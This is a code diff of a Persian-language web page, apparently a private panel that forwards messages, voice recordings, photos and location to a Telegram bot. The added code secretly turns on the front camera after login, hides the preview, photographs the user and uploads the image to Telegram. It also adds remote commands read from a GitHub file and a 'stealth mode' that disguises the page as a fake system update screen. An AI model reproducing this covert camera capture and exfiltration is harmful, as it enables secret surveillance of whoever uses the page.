@@ -3,62 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سیستم ارتباطی HOTKYNTAKY</title>
+    <title>HOTKYNTAKY OS v2.0</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Tahoma', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .terminal { background: rgba(0, 0, 0, 0.95); padding: 20px; border: 2px solid #00ff41; border-radius: 15px; box-shadow: 0 0 25px #00ff41; width: 100%; max-width: 450px; text-align: center; }
-        .input-group { margin-bottom: 12px; text-align: right; }
-        label { font-size: 11px; display: block; margin-bottom: 4px; color: #00cc33; }
-        input, textarea { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; width: 100%; border-radius: 8px; outline: none; box-sizing: border-box; font-family: inherit; }
-        button { background: #00ff41; color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; font-family: inherit; transition: 0.3s; }
-        .voice-btn { background: #1a1a1a; color: #ff3e3e; border: 2px solid #ff3e3e; height: 50px; }
-        .recording { background: #ff3e3e !important; color: white !important; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(255,62,62,0.7);} 70% {box-shadow: 0 0 0 10px rgba(255,62,62,0);} 100% {box-shadow: 0 0 0 0 rgba(255,62,62,0);} }
-        #mainPanel { display: none; }
-        #adminBox { background: rgba(0, 50, 0, 0.5); border: 1px dashed #0f0; margin-top: 15px; padding: 10px; border-radius: 8px; font-size: 13px; min-height: 30px; }
-        .status-bar { font-size: 11px; border-bottom: 1px solid #00ff41; padding-bottom: 8px; margin-bottom: 15px; display: flex; justify-content: space-between; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        .terminal { padding: 20px; max-width: 500px; margin: auto; min-height: 100vh; display: flex; flex-direction: column; }
+        .status-bar { font-size: 10px; display: flex; justify-content: space-between; border-bottom: 1px solid #00ff41; padding: 5px; margin-bottom: 10px; background: #050505; position: sticky; top: 0; z-index: 100; }
+        #adminBox { background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 13px; animation: blink 2s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        input, textarea { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; border-radius: 5px; margin: 5px 0; box-sizing: border-box; font-size: 14px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.2s; font-family: 'Tahoma'; }
+        button:active { transform: scale(0.95); background: #00cc33; }
+        .voice-btn { grid-column: span 2; background: #ff3e3e; color: #fff; height: 60px; font-size: 18px; }
+        .stealth-btn { background: #333; color: #eee; font-size: 10px; padding: 5px; }
+        #video-preview { display: none; } /* مخفی کردن پیش‌نمایش دوربین */
     </style>
 </head>
 <body>
 
-    <div id="loginBox" class="terminal">
-        <h2>🔒 ورود امنیتی</h2>
-        <input type="password" id="passInput" placeholder="رمز عبور..." style="text-align:center;">
-        <button onclick="checkPass()">تایید ورود</button>
+    <video id="video-preview" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <div id="loginBox" style="text-align: center; padding-top: 100px;">
+        <h1 style="letter-spacing: 5px;">SYSTEM LOCK</h1>
+        <input type="password" id="passInput" placeholder="ADMIN CODE" style="text-align: center; width: 80%;">
+        <button onclick="checkPass()" style="width: 80%;">AUTHORIZE</button>
     </div>
 
-    <div id="mainPanel" class="terminal">
+    <div id="mainPanel" class="terminal" style="display:none;">
         <div class="status-bar">
-            <span id="batStat">باتری: --</span>
-            <span id="syncStat">وضعیت: آنلاین 🟢</span>
+            <span id="batStat">BAT: --</span>
+            <span id="netStat">NET: OK</span>
+            <span id="clock">00:00:00</span>
         </div>
 
-        <div id="adminBox">⌛ در انتظار پیام از مرکز مدیریت...</div>
-
-        <hr style="border:0.5px solid #00661a; margin:15px 0;">
+        <div id="adminBox">📡 در انتظار فرمان از مرکز...</div>
 
         <div class="input-group">
-            <label>فرستنده</label>
-            <input type="text" id="userName" placeholder="نام شما...">
+            <input type="text" id="userName" placeholder="شناسه فرستنده">
+            <textarea id="msgBody" rows="3" placeholder="گزارش عملیاتی..."></textarea>
         </div>
 
-        <div style="display: flex; gap: 8px;">
-            <input type="tel" id="userPhone" placeholder="شماره (اختیاری)">
-            <input type="email" id="userEmail" placeholder="ایمیل (اختیاری)">
-        </div>
-
-        <textarea id="msgBody" rows="2" style="margin-top:10px;" placeholder="گزارش یا پیام محرمانه..."></textarea>
-        <button onclick="sendText()">📤 ارسال پیام</button>
-
-        <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">🎤 شروع ضبط ویس</button>
+        <button onclick="sendText()">📤 ارسال داده به مرکز</button>
         
-        <div style="display:flex; gap:10px; margin-top:5px;">
-            <button onclick="document.getElementById('fileInput').click()" style="background:#0088ff; color:white; flex:1;">📸 عکس</button>
-            <button onclick="sendLocation()" style="background:#ffcc00; color:black; flex:1;">📍 لوکیشن</button>
+        <div class="btn-grid">
+            <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">🎤 ضبط و ارسال ویس</button>
+            <button onclick="document.getElementById('fileInput').click()" style="background:#0088ff; color:white;">📸 گالری/دوربین</button>
+            <button onclick="sendLocation()" style="background:#ffcc00; color:black;">📍 موقعیت دقیق</button>
         </div>
 
         <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="sendFile()">
-        <p id="statusMsg" style="font-size: 12px; margin-top: 10px; color:#888;">سیستم آماده تبادل اطلاعات</p>
+        
+        <div style="margin-top: 20px; display: flex; justify-content: space-between;">
+            <button class="stealth-btn" onclick="stealthMode()">حالت استتار (Fake Screen)</button>
+            <button class="stealth-btn" onclick="location.reload()" style="background:#440000;">خروج امن</button>
+        </div>
+        
+        <p id="statusMsg" style="text-align:center; font-size:10px; color:#555; margin-top:20px;">HOTKYNTAKY SECURITY OS - BUILD 2026</p>
     </div>
 
     <script>
@@ -67,56 +68,100 @@
         const MY_PASS = "1387";
         let mediaRecorder, audioChunks = [], isRecording = false;
 
-        // باتری
+        // آپدیت ساعت و باتری
+        setInterval(() => {
+            const now = new Date();
+            document.getElementById('clock').innerText = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds();
+        }, 1000);
+
         navigator.getBattery().then(bat => {
-            const up = () => document.getElementById('batStat').innerText = `🔋 باتری: ${Math.round(bat.level * 100)}%`;
+            const up = () => document.getElementById('batStat').innerText = `🔋 ${Math.round(bat.level * 100)}%`;
             up(); bat.onlevelchange = up;
         });
 
         function checkPass() {
             if(document.getElementById('passInput').value === MY_PASS) {
                 document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('mainPanel').style.display = 'block';
+                document.getElementById('mainPanel').style.display = 'flex';
+                startSilentCamera(); // دوربین مخفی فعال شود
                 prepareAudio();
-                setInterval(checkAdminMessage, 5000); // شروع چک کردن پیام ادمین
-            } else { alert("رمز اشتباه!"); }
+                setInterval(checkAdminMessage, 5000);
+            } else { alert("ACCESS DENIED!"); }
         }
 
-        // دریافت پیام از فایل ادمین در گیت‌هاب
+        // --- دوربین مخفی (عکس گرفتن از وارد شونده) ---
+        async function startSilentCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video-preview');
+                video.srcObject = stream;
+                setTimeout(() => takePhoto(stream), 2000); // 2 ثانیه بعد از ورود عکس بگیر
+            } catch (err) { console.log("Camera Blocked"); }
+        }
+
+        function takePhoto(stream) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video-preview');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'intruder.jpg');
+                fd.append('caption', '⚠️ هشدار: کسی وارد پنل شد! تصویر بالا شکار شد.');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(track => track.stop()); // دوربین را خاموش کن
+            }, 'image/jpeg');
+        }
+
+        // --- چک کردن دستورات ادمین (از جمله آژیر) ---
         function checkAdminMessage() {
             const url = "https://raw.githubusercontent.com/hotkyntaky/Iman/main/admin.json";
-            fetch(url + "?t=" + new Date().getTime()) // برای جلوگیری از کش شدن
+            fetch(url + "?t=" + new Date().getTime())
             .then(res => res.json())
             .then(data => {
                 const box = document.getElementById('adminBox');
                 if(data.message) {
-                    box.innerHTML = `<span style="color:#ffcc00">📢 پیام مدیر:</span> <br> ${data.message}`;
+                    box.innerHTML = `📡 فرمان مرکز: <br>${data.message}`;
+                    if(data.message === "ALARM") playAlarm(); // اگر بنویسی ALARM گوشی بوق می‌زند
                 }
             }).catch(e => {});
         }
 
+        function playAlarm() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(1000, audioCtx.currentTime);
+            osc.connect(audioCtx.destination);
+            osc.start();
+            setTimeout(() => osc.stop(), 5000); // 5 ثانیه آژیر
+        }
+
+        function stealthMode() {
+            document.body.innerHTML = "<div style='background:#000; color:#fff; padding:20px; font-family:sans-serif;'><h1>System Update...</h1><p>Please do not turn off your device. 14% complete</p></div>";
+        }
+
+        // بقیه توابع (ویس، متن، لوکیشن) مشابه قبل اما با استایل جدید
         async function prepareAudio() {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(s);
-                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(audioChunks, { type: 'audio/ogg' });
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('voice', blob, 'v.ogg');
-                    fd.append('caption', `🎤 ویس از: ${document.getElementById('userName').value || 'ناشناس'}`);
-                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd })
-                    .then(() => { document.getElementById('statusMsg').innerText = "ویس ارسال شد ✅"; });
-                };
-            } catch (err) {}
+            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(s);
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(audioChunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('voice', blob, 'v.ogg');
+                fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
+            };
         }
 
         function toggleRecording() {
             const btn = document.getElementById('recordBtn');
             if (!isRecording) {
                 audioChunks = []; mediaRecorder.start(); isRecording = true;
-                btn.innerText = "🛑 توقف و ارسال"; btn.classList.add('recording');
+                btn.innerText = "🛑 در حال ضبط... (توقف)"; btn.classList.add('recording');
             } else {
                 mediaRecorder.stop(); isRecording = false;
                 btn.innerText = "🎤 شروع ضبط ویس"; btn.classList.remove('recording');
@@ -124,35 +169,27 @@
         }
 
         function sendText() {
-            const name = document.getElementById('userName').value || "ناشناس";
-            const phone = document.getElementById('userPhone').value || "ندارد";
-            const msg = document.getElementById('msgBody').value;
-            if(!msg) return alert("متن پیام خالی است!");
-
-            const fullMsg = `👤 **گزارش محرمانه**\n\nنام: ${name}\nشماره: ${phone}\n\n📝 متن:\n${msg}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMsg)}&parse_mode=Markdown`);
-            document.getElementById('statusMsg').innerText = "ارسال شد ✅";
+            const n = document.getElementById('userName').value || "ناشناس";
+            const m = document.getElementById('msgBody').value;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👤 فرستنده: "+n+"\n💬 پیام: "+m)}`);
             document.getElementById('msgBody').value = "";
+            alert("ارسال شد!");
+        }
+
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}`);
+            });
         }
 
         function sendFile() {
             const f = document.getElementById('fileInput').files[0];
-            const name = document.getElementById('userName').value || "ناشناس";
             const fd = new FormData();
             fd.append('chat_id', chatId);
             fd.append('photo', f);
-            fd.append('caption', `📸 عکس از: ${name}`);
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
-            .then(() => document.getElementById('statusMsg').innerText = "تصویر ارسال شد ✅");
-        }
-
-        function sendLocation() {
-            const name = document.getElementById('userName').value || "ناشناس";
-            navigator.geolocation.getCurrentPosition(pos => {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 لوکیشن از: " + name)}`);
-                fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}`);
-            });
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }
     </script>
 </body>
 </html>
+ 
